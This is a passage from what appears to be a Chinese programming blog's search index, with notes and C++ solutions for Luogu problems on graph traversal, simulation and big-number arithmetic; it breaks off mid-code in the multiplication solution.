class="line">  <span class="built_in">dfs</span>(<span class="number">1</span>);</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(st, <span class="number">0</span>, <span class="built_in">sizeof</span>(st));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">bfs</span>(<span class="number">1</span>);</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在搜索途中发现<a href="https://www.yuque.com/lixinbo-9kba4/ul8e9e/ckgwhd?">查找文献 (yuque.com)</a>，我们其实是可以对输入进行排序的，首先要创建存储x，y的节点，将输入存储进去。</p><p>接下来是排序：</p><ol><li>对于x，母庸置疑，我们将较小值置前。</li><li>对于y，较小值置前？     不是。<code>链式前向星</code>中h[a]存储的是第一条边的索引，且该索引能被覆盖。因此我们应该倒序存储，这样才能使h[a]存储的是最小值的边。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span> + <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx = <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> st[N]; <span class="comment">// 标记数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">nod</span> &#123;</span><br><span class="line">  <span class="type">int</span> x, y;</span><br><span class="line">&#125; node[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  e[idx] = b;     <span class="comment">// 添加边 b</span></span><br><span class="line">  ne[idx] = h[a]; <span class="comment">//下一条边的索引</span></span><br><span class="line">  h[a] = idx++;<span class="comment">//该节点第一条边的索引</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">  st[u] = <span class="literal">true</span>;</span><br><span class="line">  cout &lt;&lt; u &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">    <span class="type">int</span> j = e[i];</span><br><span class="line">    <span class="keyword">if</span> (!st[j]) &#123;</span><br><span class="line">      <span class="built_in">dfs</span>(j);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">  queue&lt;<span class="type">int</span>&gt; que;</span><br><span class="line">  que.<span class="built_in">push</span>(u);</span><br><span class="line">  st[u] = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">    <span class="type">int</span> t = que.<span class="built_in">front</span>();</span><br><span class="line">    que.<span class="built_in">pop</span>();</span><br><span class="line">    cout &lt;&lt; t &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">      <span class="type">int</span> j = e[i];</span><br><span class="line">      <span class="keyword">if</span> (!st[j]) &#123;</span><br><span class="line">        st[j] = <span class="literal">true</span>;</span><br><span class="line">        que.<span class="built_in">push</span>(j);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">  cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="built_in">sizeof</span>(h));</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    node[i].x = a;</span><br><span class="line">    node[i].y = b;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(node, node + m, [](nod a, nod b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a.x != b.x) &#123;</span><br><span class="line">      <span class="keyword">return</span> a.x &lt; b.x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> a.y &gt; b.y; <span class="comment">//由于h[a]的idx会被最后一条idx覆盖,因此我们应该倒序存储</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    <span class="built_in">add</span>(node[i].x, node[i].y);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(st, <span class="number">0</span>, <span class="built_in">sizeof</span>(st)); <span class="comment">// 初始化标记数组</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">dfs</span>(<span class="number">1</span>);</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(st, <span class="number">0</span>, <span class="built_in">sizeof</span>(st)); <span class="comment">// 重新初始化标记数组</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">bfs</span>(<span class="number">1</span>);</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P3916-图的遍历"><a href="#P3916-图的遍历" class="headerlink" title="P3916 图的遍历"></a>P3916 图的遍历</h3><p>这题采用反向建边的方法，即从最大的点到最小的点，依次进行深度优先搜索，最后得出的st数组即为该点能达到的最大值。而不需要对每条边都进行深搜且将st数组置0。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷题单——模拟与高精度</title>
      <link href="/2024/05/15/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E6%A8%A1%E6%8B%9F%E4%B8%8E%E9%AB%98%E7%B2%BE%E5%BA%A6/"/>
      <url>/2024/05/15/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E6%A8%A1%E6%8B%9F%E4%B8%8E%E9%AB%98%E7%B2%BE%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h3 id="P1042-NOIP2003-普及组-乒乓球"><a href="#P1042-NOIP2003-普及组-乒乓球" class="headerlink" title="P1042 [NOIP2003 普及组] 乒乓球"></a>P1042 [NOIP2003 普及组] 乒乓球</h3><p><img src="image-20241111135825741.png" alt="image-20241111135825741"></p><p>这题我刚开始一直无法理解<code>直到分差大于或者等于 22，才一局结束。</code>后面一想，这不就是加球吗？那么，这题就好解了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">judge</span><span class="params">(<span class="type">const</span> string&amp; arr, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> me = <span class="number">0</span>, em = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> ch : arr) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;W&#x27;</span>) me++;</span><br><span class="line">        <span class="keyword">else</span> em++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((me &gt;= n || em &gt;= n) &amp;&amp; <span class="built_in">abs</span>(me - em) &gt;= <span class="number">2</span>) &#123;<span class="comment">//记得要加abs取绝对值</span></span><br><span class="line">            cout &lt;&lt; me &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; em &lt;&lt; endl;</span><br><span class="line">            me = em = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; me &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; em &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string arr;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; ch &amp;&amp; ch != <span class="string">&#x27;E&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;W&#x27;</span> || ch == <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">            arr += ch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">judge</span>(arr, <span class="number">11</span>);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">judge</span>(arr, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P2670-NOIP2015-普及组-扫雷游戏"><a href="#P2670-NOIP2015-普及组-扫雷游戏" class="headerlink" title="P2670 [NOIP2015 普及组] 扫雷游戏"></a>P2670 [NOIP2015 普及组] 扫雷游戏</h3><p><img src="洛谷模拟与高精度.assets/image-20240708095421079.png" alt="image-20240708095421079"></p><p>注意数组类型为<code>char</code>，存储ascii码取数组下标为1开始（减少越界判断），对每个格子进行3*3的判定，返回判定值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;。iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> NUM = <span class="number">105</span>;</span><br><span class="line"><span class="type">char</span> arr[NUM][NUM]; <span class="comment">//char</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">judge</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(arr[x][y] == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = x - <span class="number">1</span>; i &lt;= x + <span class="number">1</span>; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = y - <span class="number">1</span>; j &lt;= y + <span class="number">1</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[i][j] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">        n++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m, res;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      cin &gt;&gt; arr[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">    <span class="keyword">if</span>((res = <span class="built_in">judge</span>(i, j)) != <span class="number">-1</span>)</span><br><span class="line">        cout &lt;&lt; res ;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;*&quot;</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1563-NOIP2016-提高组-玩具谜题"><a href="#P1563-NOIP2016-提高组-玩具谜题" class="headerlink" title="P1563 [NOIP2016 提高组] 玩具谜题"></a>P1563 [NOIP2016 提高组] 玩具谜题</h3><p><img src="洛谷模拟与高精度.assets/image-20240708100633908.png" alt="image-20240708100633908"></p><p>在这里，我们只需要对顺时针数还是逆时针数做出判断，然后对循环数组进行加减。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; way;</span><br><span class="line">vector&lt;string&gt; str;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="type">int</span> chaoxiang, fangxiang, step;</span><br><span class="line">    string s;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i  = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; chaoxiang &gt;&gt; s;</span><br><span class="line">        way.<span class="built_in">push_back</span>(chaoxiang);</span><br><span class="line">        str.<span class="built_in">push_back</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; fangxiang &gt;&gt; step;</span><br><span class="line">        <span class="keyword">if</span>(fangxiang == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(way[pos] == <span class="number">0</span>)</span><br><span class="line">            pos = (pos + n - step)%n;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            pos = (pos + n + step)%n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span>(way[pos] == <span class="number">0</span>)</span><br><span class="line">            pos = (pos + n + step)%n;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">            pos = (pos + n - step)%n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; str[pos]&lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1601-A-B-Problem（高精）"><a href="#P1601-A-B-Problem（高精）" class="headerlink" title="P1601 A+B Problem（高精）"></a>P1601 A+B Problem（高精）</h3><p><img src="洛谷模拟与高精度.assets/image-20240708101315820.png" alt="image-20240708101315820"></p><p>我们需要用数组存储A，B，由于运算是从最低位开始的，我们可以采用逆序存储数组。在加法函数，逐位加法，记录进位。别忘了循环后还可能有进位。最后将数组逆序即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; A;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; B;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">add</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (A.<span class="built_in">size</span>() &lt; B.<span class="built_in">size</span>())</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">add</span>(B, A);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || i &lt; B.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="comment">// t + = A[i];</span></span><br><span class="line">    <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>())</span><br><span class="line">      t += A[i];</span><br><span class="line">    <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>())</span><br><span class="line">      t += B[i];</span><br><span class="line">    C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">    t /= <span class="number">10</span>; <span class="comment">//去进位</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (t)</span><br><span class="line">    C.<span class="built_in">push_back</span>(<span class="number">1</span>); <span class="comment">//有无进位判断</span></span><br><span class="line">  <span class="built_in">reverse</span>(C.<span class="built_in">begin</span>(), C.<span class="built_in">end</span>());</span><br><span class="line">  <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> tmp;</span><br><span class="line">  string a, b;</span><br><span class="line"></span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="comment">//逆序存放进数组</span></span><br><span class="line">    A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; res = <span class="built_in">add</span>(A, B);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> tmp : res) &#123;</span><br><span class="line">    cout &lt;&lt; tmp;</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1303-A-B-Problem"><a href="#P1303-A-B-Problem" class="headerlink" title="P1303 A*B Problem"></a>P1303 A*B Problem</h3><p><img src="洛谷模拟与高精度.assets/image-20240708103000489.png" alt="image-20240708103000489"></p><p> 模仿乘法，这次采用顺序存储，对于乘法，我们可以采用类似dp的思路，由于是<code>多位数*多位数</code>的乘法，在每次<code>多位数*一位数</code>，相加的时候，都会有重叠，我们应当小心处理这种重叠，<code>进位=原来的值+相乘的值+进位</code> ，且第<code>i</code>个元素与第<code>j</code>个元素存储于<code>i+j+1</code>的位置（下标从0开始）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="type">int</span>&gt; A，, vector&lt;<span class="type">int</span>&gt; B)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">res</span><span class="params">(A.size() + B.size(), <span class="number">0</span>)</span></span>;<span class="comment">//预留位置</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="type">int</span> carry = <span class="number">0</span>;      <span class="comment">//进位</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = B.<span class="built_in">size</span>() - <span class="number">1</span>; j &gt;= <span 